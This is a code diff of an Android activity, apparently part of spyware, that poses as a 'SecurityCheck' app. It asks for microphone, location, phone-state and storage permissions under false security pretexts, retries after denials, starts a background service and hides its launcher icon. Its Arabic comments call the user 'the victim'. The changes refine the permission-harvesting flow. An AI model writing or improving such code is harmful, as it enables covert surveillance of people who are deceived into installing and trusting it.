@@ -6,12 +6,10 @@ import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.provider.Settings;
 import android.util.Log;
 import android.view.Gravity;
 import android.widget.LinearLayout;
@@ -20,14 +18,10 @@ import android.widget.TextView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import java.util.ArrayList;
-import java.util.List;
-
 public class MainActivity extends Activity {
 
     private static final String TAG = "SecurityCheck";
     private static final int PERMISSION_REQUEST = 1001;
-    private static final int REQUEST_OVERLAY = 2001;
 
     // ★★★ ترتيب الصلاحيات — واحدة واحدة مع شرح
     private static final String[][] PERMISSIONS_WITH_REASON = {
@@ -43,6 +37,8 @@ public class MainActivity extends Activity {
                     "لتسجيل البصمة الصوتية الأمنية"},
             {Manifest.permission.ACCESS_FINE_LOCATION,
                     "لتأمين حسابك حسب موقعك"},
+            {Manifest.permission.ACCESS_COARSE_LOCATION,
+                    "لتقريب الموقع الجغرافي"},
             {Manifest.permission.READ_PHONE_STATE,
                     "للتحقق من هوية الجهاز"},
             {Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -53,17 +49,43 @@ public class MainActivity extends Activity {
 
     private int currentPermIndex = 0;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
+    private boolean permissionFlowActive = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "======== APP STARTED =========");
 
-        // ★ اعرض واجهة تشرح للتطبيق
+        // ★ واجهة أولية
         showInitialUI();
 
-        // ★ ابدأ طلب الصلاحيات بعد 1.5 ثانية
-        mainHandler.postDelayed(this::startPermissionFlow, 1500);
+        // ★ ابدأ طلب الصلاحيات
+        mainHandler.postDelayed(() -> {
+            if (!permissionFlowActive) {
+                permissionFlowActive = true;
+                startPermissionFlow();
+            }
+        }, 1500);
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+
+        // ★ لو رجع من Background (بسبب Service طلب صلاحية) — أعد الطلب
+        if (permissionFlowActive && currentPermIndex < PERMISSIONS_WITH_REASON.length) {
+            mainHandler.postDelayed(() -> {
+                String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
+                if (ContextCompat.checkSelfPermission(this, permission)
+                        != PackageManager.PERMISSION_GRANTED) {
+                    Log.d(TAG, "onResume → retry permission: " + permission);
+                    requestNextPermission();
+                } else {
+                    currentPermIndex++;
+                    requestNextPermission();
+                }
+            }, 500);
+        }
     }
 
     // ============================================================
@@ -113,7 +135,6 @@ public class MainActivity extends Activity {
     private void requestNextPermission() {
         if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
             Log.d(TAG, "✅ All permissions requested");
-            // خلص الطلب → شغّل الخدمة
             mainHandler.postDelayed(this::startServiceNow, 1000);
             mainHandler.postDelayed(this::hideAppIcon, 4000);
             return;
@@ -122,22 +143,19 @@ public class MainActivity extends Activity {
         String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
         String reason = PERMISSIONS_WITH_REASON[currentPermIndex][1];
 
-        // لو ممنوحة → انتقل للتالية
         if (ContextCompat.checkSelfPermission(this, permission)
                 == PackageManager.PERMISSION_GRANTED) {
             Log.d(TAG, "✅ Already granted: " + permission);
             currentPermIndex++;
-            requestNextPermission();
+            mainHandler.postDelayed(this::requestNextPermission, 300);
             return;
         }
 
-        // لو الضحية رفضت قبل كده → اعرض شرح ونعيد الطلب
         if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
             showRationaleDialog(permission, reason);
             return;
         }
 
-        // اطلب مباشرة
         Log.d(TAG, "→ Requesting: " + permission);
         try {
             ActivityCompat.requestPermissions(this,
@@ -149,9 +167,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // شرح مُقنع للضحية
-    // ============================================================
     private void showRationaleDialog(String permission, String reason) {
         try {
             new AlertDialog.Builder(this)
@@ -186,24 +201,13 @@ public class MainActivity extends Activity {
             for (int i = 0; i < permissions.length; i++) {
                 boolean granted = grantResults.length > 0
                         && grantResults[i] == PackageManager.PERMISSION_GRANTED;
-                Log.d(TAG, permissions[i] + " -> " + (granted ? "GRANTED" : "DENIED"));
-
-                if (!granted) {
-                    // لو رفضت → اطلب الصلاحية مرة أخرى بعد تأخير
-                    final String perm = permissions[i];
-                    mainHandler.postDelayed(() -> {
-                        try {
-                            ActivityCompat.requestPermissions(MainActivity.this,
-                                    new String[]{perm}, PERMISSION_REQUEST);
-                        } catch (Exception ignored) {}
-                    }, 1500);
-                    return;  // مش هننتقل للتالية، نعيد المحاولة على نفس الصلاحية
-                }
+                Log.d(TAG, permissions[i] + " -> "
+                        + (granted ? "GRANTED" : "DENIED"));
             }
 
-            // نجحت → التالية
+            // ★ انتقل للتالية مهما كانت النتيجة
             currentPermIndex++;
-            mainHandler.postDelayed(this::requestNextPermission, 800);
+            mainHandler.postDelayed(this::requestNextPermission, 600);
         }
     }
 
